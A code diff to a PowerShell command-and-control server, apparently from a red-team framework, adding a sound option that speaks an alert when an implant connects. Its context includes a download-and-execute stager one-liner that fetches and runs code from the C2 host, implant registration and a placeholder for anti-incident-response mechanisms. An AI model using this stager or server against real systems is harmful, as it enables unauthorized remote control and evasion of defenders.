@@ -748,6 +748,7 @@ if ($args[0])
     $shortcut = $c2serverresults.QuickCommand
     $downloaduri = $c2serverresults.DownloadURI
     $httpresponse = $c2serverresults.HTTPResponse
+    $enablesound = $c2serverresults.Sounds
 
     Write-Host `n"Listening on: $ipv4address Port $serverport (HTTP) | Kill date $killdatefm" `n -ForegroundColor Green
     Write-Host "To quickly get setup for internal pentesting, run:"
@@ -818,6 +819,10 @@ else
     $defaultserverport = 80
     $prompt = Read-Host -Prompt "[5] Enter the HTTP port you want to use, 80 is highly preferable for proxying [$($defaultserverport)]"
     $serverport = ($defaultserverport,$prompt)[[bool]$prompt]
+
+    $enablesound = "Yes"
+    $prompt = Read-Host -Prompt "[6] Do you want to enable sound? [$($enablesound)]"
+    $enablesound = ($enablesound,$prompt)[[bool]$prompt]
     
     $downloaduri = Get-RandomURI -Length 5
     $shortcut = "powershell -exec bypass -c "+'"'+"IEX (new-object system.net.webclient).downloadstring('http://$($ipv4address):$($serverport)/$($downloaduri)')"+'"'+"" 
@@ -894,7 +899,8 @@ else
         DownloadURI TEXT,
         ProxyURL TEXT,
         ProxyUser TEXT,
-        ProxyPass TEXT)'
+        ProxyPass TEXT,
+        Sounds TEXT)'
 
     Invoke-SqliteQuery -Query $Query -DataSource $Database | Out-Null
 
@@ -904,8 +910,8 @@ else
 
     Invoke-SqliteQuery -Query $Query -DataSource $Database | Out-Null
 
-    $Query = 'INSERT INTO C2Server (DefaultSleep, KillDate, HostnameIP, HTTPResponse, FolderPath, ServerPort, QuickCommand, DownloadURI)
-            VALUES (@DefaultSleep, @KillDate, @HostnameIP, @HTTPResponse, @FolderPath, @ServerPort, @QuickCommand, @DownloadURI)'
+    $Query = 'INSERT INTO C2Server (DefaultSleep, KillDate, HostnameIP, HTTPResponse, FolderPath, ServerPort, QuickCommand, DownloadURI, Sounds)
+            VALUES (@DefaultSleep, @KillDate, @HostnameIP, @HTTPResponse, @FolderPath, @ServerPort, @QuickCommand, @DownloadURI, @Sounds)'
 
     Invoke-SqliteQuery -DataSource $Database -Query $Query -SqlParameters @{
         DefaultSleep = $defaultbeacon
@@ -916,6 +922,7 @@ else
         ServerPort = $serverport
         QuickCommand = $shortcut
         DownloadURI = $downloaduri
+        Sounds = $enablesound
     } | Out-Null
         
     Write-Host `n"Listening on: $ipv4address Port $serverport (HTTP) | Kill Date $killdatefm"`n -ForegroundColor Green
@@ -1100,11 +1107,15 @@ while ($listener.IsListening)
         # if ($im_domain -ne "safenet") { do something }
         #
         ## add anti-ir and implant safety mechanisms here!
-        #$sound = new-Object System.Media.SoundPlayer;
-        #$sound.SoundLocation="C:\Temp\PowershellC2\Sounds\pwned.wav";
-        #$sound.Play()
+
         Write-Host "New Daisy chain implant connected: (uri=$randomuri, key=$key)" -ForegroundColor Green
         Write-Host "$endpointip | PID:$im_pid | Sleep:$defaultbeacon | $im_computername $im_domain ($im_arch) "`n -ForegroundColor Green
+
+        if ($enablesound -eq "Yes") {
+            $voice = New-Object -com SAPI.SpVoice                        
+            $voice.rate = -2                        
+            $voice.Speak("Nice, we have a daisy chain implant")|Out-Null
+        }
 
         $Query = 'INSERT INTO Implants (RandomURI, User, Hostname, IpAddress, Key, FirstSeen, LastSeen, PID, Arch, Domain, Alive, Sleep, ModsLoaded)
         VALUES (@RandomURI, @User, @Hostname, @IpAddress, @Key, @FirstSeen, @LastSeen, @PID, @Arch, @Domain, @Alive, @Sleep, @ModsLoaded)'
@@ -1336,11 +1347,15 @@ $message =[Convert]::ToBase64String($Bytes)
         # if ($im_domain -ne "safenet") { do something }
         #
         ## add anti-ir and implant safety mechanisms here!
-        #$sound = new-Object System.Media.SoundPlayer;
-        #$sound.SoundLocation="C:\Temp\PowershellC2\Sounds\pwned.wav";
-        #$sound.Play()
+
         Write-Host "New host connected: (uri=$randomuri, key=$key)" -ForegroundColor Green
         Write-Host "$endpointip | PID:$im_pid | Sleep:$defaultbeacon | $im_computername $im_domain ($im_arch) "`n -ForegroundColor Green
+
+        if ($enablesound -eq "Yes") {
+            $voice = New-Object -com SAPI.SpVoice                        
+            $voice.rate = -2                        
+            $voice.Speak("Nice, we have an implant")|Out-Null
+        }
 
         $Query = 'INSERT INTO Implants (RandomURI, User, Hostname, IpAddress, Key, FirstSeen, LastSeen, PID, Arch, Domain, Alive, Sleep, ModsLoaded)
         VALUES (@RandomURI, @User, @Hostname, @IpAddress, @Key, @FirstSeen, @LastSeen, @PID, @Arch, @Domain, @Alive, @Sleep, @ModsLoaded)'
